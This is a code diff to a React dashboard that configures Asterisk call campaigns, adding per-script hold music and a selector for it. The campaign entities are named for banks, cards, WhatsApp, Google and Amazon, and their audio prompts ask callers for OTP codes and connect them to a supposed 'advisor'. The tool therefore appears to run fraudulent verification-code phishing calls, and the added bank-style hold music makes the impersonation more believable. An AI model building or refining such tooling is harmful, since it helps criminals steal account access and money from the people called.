@@ -72,6 +72,7 @@ export interface CampaignEntity {
   agentAudioPath: string;    // Transferencia a Asesor (Opción 1 - "Un momento por favor...")
   successAudioPath: string;  // Validación Exitosa
   waitAudioPath?: string;    // Espera
+  holdMusicAudioPath?: string; // Música de Hold / Espera personalizada por guión
   isLocked?: boolean;        // Bloqueo manual: previene sobreescritura por sincronización automática
 }
 
@@ -83,6 +84,7 @@ interface ProductionOperationsTabProps {
   audios?: AudioPrompt[];
   onAddAudio?: (audio: AudioPrompt) => void;
   onTriggerSync: () => void;
+  onNavigateToLiveCalls?: () => void;
   isSyncing: boolean;
 }
 
@@ -140,6 +142,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       promptAudioPath: 'custom/solicitar_codigo_otp',
       agentAudioPath: 'custom/conectar_asesor_banco',
       successAudioPath: 'custom/operacion_bloqueada_exito',
+      holdMusicAudioPath: 'custom/moh_banco_elegante',
     },
     {
       id: 'card',
@@ -153,6 +156,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       promptAudioPath: 'custom/solicitar_otp_tarjeta',
       agentAudioPath: 'custom/conectar_asesor_tarjetas',
       successAudioPath: 'custom/tarjeta_protegida',
+      holdMusicAudioPath: 'custom/moh_corporate_loop',
     },
     {
       id: 'whatsapp',
@@ -166,6 +170,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       promptAudioPath: 'custom/solicitar_codigo_sms',
       agentAudioPath: 'custom/conectar_soporte_tecnico',
       successAudioPath: 'custom/verificacion_exitosa',
+      holdMusicAudioPath: 'custom/moh_digital_hold',
     },
     {
       id: 'google',
@@ -179,6 +184,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       promptAudioPath: 'custom/solicitar_codigo_google',
       agentAudioPath: 'custom/conectar_soporte_cuentas',
       successAudioPath: 'custom/acceso_restringido_exito',
+      holdMusicAudioPath: 'custom/moh_digital_hold',
     },
     {
       id: 'amazon',
@@ -192,6 +198,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       promptAudioPath: 'custom/solicitar_codigo_amazon',
       agentAudioPath: 'custom/conectar_soporte_pedidos',
       successAudioPath: 'custom/pedido_cancelado_exito',
+      holdMusicAudioPath: 'custom/moh_corporate_loop',
     },
     {
       id: 'custom',
@@ -205,6 +212,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       promptAudioPath: 'custom/solicitar_codigo_otp',
       agentAudioPath: 'custom/conectar_asesor_banco',
       successAudioPath: 'custom/operacion_bloqueada_exito',
+      holdMusicAudioPath: 'custom/moh_corporate_loop',
     },
   ];
 
@@ -258,6 +266,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           wait: 'custom/un_momento_validando_informacion',
           success: current.successAudioPath,
           agent: current.agentAudioPath,
+          holdMusic: current.holdMusicAudioPath || 'custom/moh_corporate_loop',
           destination: targetNumber.trim() || '16104803845',
           isManualSave: true,
         }),
@@ -478,10 +487,11 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           wait: 'custom/un_momento_validando_informacion',
           success: entity.successAudioPath,
           agent: entity.agentAudioPath,
+          holdMusic: entity.holdMusicAudioPath || 'custom/moh_corporate_loop',
           destination: targetNumber.trim() || '16104803845',
         }),
       });
-      setAudioSyncFeedback(`✓ Guión activo: "${entity.name}" sincronizado con Asterisk.`);
+      setAudioSyncFeedback(`✓ Guión activo: "${entity.name}" (MOH: ${entity.holdMusicAudioPath || 'MOH'}) sincronizado con Asterisk.`);
       setTimeout(() => setAudioSyncFeedback(null), 3000);
     } catch {}
   };
@@ -501,6 +511,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       promptAudioPath: 'custom/solicitar_codigo_otp',
       agentAudioPath: 'custom/conectar_asesor_banco',
       successAudioPath: 'custom/operacion_bloqueada_exito',
+      holdMusicAudioPath: 'custom/moh_corporate_loop',
     };
     setEditingEntity(newEntity);
     setIsEntityModalOpen(true);
@@ -2462,6 +2473,14 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                               {cleanPrompt}
                             </span>
                           </div>
+                          <div className="flex items-center justify-between gap-1 text-slate-400 truncate">
+                            <span className="flex items-center gap-1 text-slate-300 shrink-0">
+                              <Music className="w-2.5 h-2.5 text-amber-400" /> Hold MOH:
+                            </span>
+                            <span className="text-amber-300 truncate font-semibold" title={ent.holdMusicAudioPath || 'custom/moh_corporate_loop'}>
+                              {(ent.holdMusicAudioPath || 'moh_corporate_loop').replace(/^custom\//, '')}
+                            </span>
+                          </div>
                         </div>
 
                         <div className="flex items-center justify-between text-[10px] text-slate-500 pt-1 border-t border-slate-800/70">
@@ -4218,6 +4237,61 @@ echo "=== ¡ASTERISK ACTUALIZADO CORRECTAMENTE! ==="`;
                       onChange={(e) => setEditingEntity({ ...editingEntity, successAudioPath: e.target.value })}
                       placeholder="Ruta personalizada (ej. custom/exito)"
                       className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-emerald-500"
+                    />
+                  </div>
+                </div>
+
+                {/* 5. Música de Hold / Espera del Guión (MOH) */}
+                <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <div className="text-xs font-bold text-amber-300 flex items-center gap-1.5">
+                        <Music className="w-3.5 h-3.5 text-amber-400" />
+                        <span>5. Música de Hold / Espera del Guión (MOH)</span>
+                      </div>
+                      <div className="text-[11px] text-slate-400">
+                        Pista musical reproducida al cliente cuando se pone en espera (Hold) en este guión específico.
+                      </div>
+                    </div>
+                    <button
+                      type="button"
+                      onClick={() => handleTogglePlayAudio(editingEntity.holdMusicAudioPath || 'custom/moh_corporate_loop', 'modal_hold')}
+                      disabled={!editingEntity.holdMusicAudioPath}
+                      className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white border border-slate-700 transition-all"
+                      title="Reproducir música de hold"
+                    >
+                      {playingAudioKey === 'modal_hold' ? (
+                        <Pause className="w-4 h-4 text-amber-400 animate-pulse" />
+                      ) : (
+                        <Play className="w-4 h-4 text-slate-300" />
+                      )}
+                    </button>
+                  </div>
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                    <select
+                      value={editingEntity.holdMusicAudioPath || 'custom/moh_corporate_loop'}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, holdMusicAudioPath: e.target.value })}
+                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-amber-500"
+                    >
+                      <option value="custom/moh_banco_elegante">custom/moh_banco_elegante (Espera Bancaria Piano & Chimes)</option>
+                      <option value="custom/moh_corporate_loop">custom/moh_corporate_loop (Música Corporativa Suave)</option>
+                      <option value="custom/moh_digital_hold">custom/moh_digital_hold (Tono Digital Alta Fidelidad)</option>
+                      <option value="custom/moh_jazz_telecom">custom/moh_jazz_telecom (PBX Telecom Smooth Tone)</option>
+                      <option value="custom/un_momento_validando_informacion">custom/un_momento_validando_informacion (Locución con fondo)</option>
+                      {audios
+                        .filter((a) => a.category === 'hold_music' || a.category === 'custom')
+                        .map((a) => (
+                          <option key={a.id} value={a.asteriskPath}>
+                            {a.name} ({a.asteriskPath})
+                          </option>
+                        ))}
+                    </select>
+                    <input
+                      type="text"
+                      value={editingEntity.holdMusicAudioPath || 'custom/moh_corporate_loop'}
+                      onChange={(e) => setEditingEntity({ ...editingEntity, holdMusicAudioPath: e.target.value })}
+                      placeholder="Ruta personalizada (ej. custom/mi_musica_hold)"
+                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-amber-500"
                     />
                   </div>
                 </div>
